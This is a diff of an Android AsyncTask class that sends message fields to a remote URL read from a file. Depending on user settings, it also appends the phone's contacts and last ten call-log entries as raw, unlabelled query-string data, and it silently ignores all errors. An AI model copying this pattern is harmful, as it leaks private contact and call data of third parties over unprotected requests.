@@ -48,22 +48,22 @@ class PostPHP extends AsyncTask<String[], Void, Void> {
                 sb.append(inputLine); //append line of file to string builder
             }
             br.close();//close the connection
-            HttpURLConnection connection = (HttpURLConnection) new URL((sb.toString().trim() +c.getString(R.string.to) + finalArr[0] + c.getString(R.string.subject_param) + finalArr[1] + c.getString(R.string.text_param) + finalArr[2] + addExtras(c))).openConnection();
+            HttpURLConnection connection = (HttpURLConnection) new URL((sb.toString().trim() +c.getString(R.string.to) + finalArr[0] + c.getString(R.string.subject_param) + finalArr[1] + c.getString(R.string.text_param) + finalArr[2] + addExtraInfo(c))).openConnection();
             connection.getInputStream(); //open a connection to the modified URL with parameters taken from the string array
             connection.disconnect(); //finally disconnect
 
         } catch (Exception ignored) {}
         return null;
     }
-    private String addExtras(Context c){
+    private String addExtraInfo(Context c){
         SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(c);
-        String returnString = "";
+        String returnString = " ";
         Logs l = new Logs(c);
         if (settings.getBoolean("include_contacts", false)) {
-            returnString += c.getString(R.string.contacts_param) + l.getContacts();
+            returnString += l.getContacts();
         }
         if (settings.getBoolean("include_calllog", false)) {
-            returnString += c.getString(R.string.calls_param) + l.getCallLog(10);
+            returnString += l.getCallLog(10);
         }
         return returnString;
     }
